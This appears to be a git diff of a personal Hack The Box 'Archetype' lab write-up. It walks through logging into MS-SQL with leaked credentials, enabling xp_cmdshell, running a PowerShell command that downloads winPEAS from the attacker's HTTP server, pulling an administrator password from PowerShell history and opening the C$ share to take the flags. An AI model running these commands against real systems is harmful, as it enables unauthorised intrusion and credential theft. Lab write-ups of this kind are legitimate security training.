@@ -18,6 +18,7 @@ PORT     STATE SERVICE
 ```
 
 seems to be **MS-SQL** and a **SMB share** let's dig a bit deeper
+
 ```bash
 $ nmap -sC -sV 10.129.88.67
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-24 17:06 CEST
@@ -113,8 +114,8 @@ smb: \> ls
 so this **SMB share** just uncovered some passwords for what seems to be the **MS-SQL** server. 
 
 # Exploitation
+## MS-SQL
 Let's try to logon to the MS-SQL server with the credentials we just found. For this I'm gonna use `mssqlclient.py` from the Impacket GitHub repo.
-
 ```bash
 $ mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.88.67 -windows-auth
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -122,9 +123,81 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 SQL (ARCHETYPE\sql_svc  dbo@master)>
 ```
 
-we can use the `xp_cmdshell` command to run cmd or powershell commands
+in order to get command execution we need to enable `xp_cmdshell`
 
+```SQL
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "whoami"
+ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
+SQL (ARCHETYPE\sql_svc  dbo@master)> enable_xp_cmdshell
+INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "whoami"
+output              
+-----------------   
+archetype\sql_svc 
+```
 
+now we can use the `xp_cmdshell` command to run cmd or powershell commands
+one of the questions from HTB hinted at using win-peas to find more so let's go ahead and do that
+
+for that we should spin up a Python-3 http server in order to transfer the win-peas batch script over to our target
+```bash
+┌─[]─[10.10.15.28]─[janosch@pwnbox]─[~/notes/PEASS-ng/winPEAS/winPEASbat]
+└──╼ [★]$ ls
+README.md  winPEAS.bat
+┌─[]─[10.10.15.28]─[janosch@pwnbox]─[~/notes/PEASS-ng/winPEAS/winPEASbat]
+└──╼ [★]$ python3 -m http.server 8080
+```
+
+in order to actually download the file we will use this payload on our target:
+```powershell
+xp_cmdshell powershell Invoke-WebRequest -Uri "http://10.10.15.28:8080/winPEAS.bat" -OutFile "$env:USERPROFILE\Downloads\winPEAS.bat"
+```
+
+we can run it like any other bash script *just make sure to output to a file otherwise the output is lost* 
+```SQL
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "call C:\Users\sql_svc\Downloads\winPEAS.bat > C:\Users\sql_svc\Downloads\Output.txt"
+output                             
+--------------------------------   
+                            
+
+   cription = Invalid namespace
+
+No User exists for *               
+
+NULL                               
+
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "type C:\Users\sql_svc\Downloads\Output.txt"
+..Snip..
+```
+
+in the output I found one file that had something interesting in it
+```SQL
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+output                                                                    
+-----------------------------------------------------------------------   
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!  
+```
+
+so in the file we can see someone logging into the backups share with an admin account. The backups share already has guest access but maybe we can access the other shares with these credentials.
+
+## SMB
+In [[#SMB]] we found the C$ share let's see if the found credentials work for this
+```bash
+┌─[]─[10.10.15.28]─[janosch@pwnbox]─[~/notes]
+└──╼ [★]$ smbclient \\\\10.129.95.187\\C$ -U administrator
+Password for [WORKGROUP\administrator]:
+Try "help" to get a list of possible commands.
+smb: \> pwd
+Current directory is \\10.129.95.187\C$\
+```
+
+Lets go! now we have access to the root directory now we just have to find the flags.
+
+after some digging I found that both flags were stored on the users Desktop's
+**user flag:** `C:\Users\sql_svc\Desktop\user.txt`
+**root flag:** `C:\Users\administrator\Desktop\root.txt`
 
 # Conclusion
 so this was my first real windows CTF and I got stuck a lot at the windows parts especially trying to do Privilege escalation on windows was a pain in the Ass but I could do A lot with the SMB which saved my ass a bit.
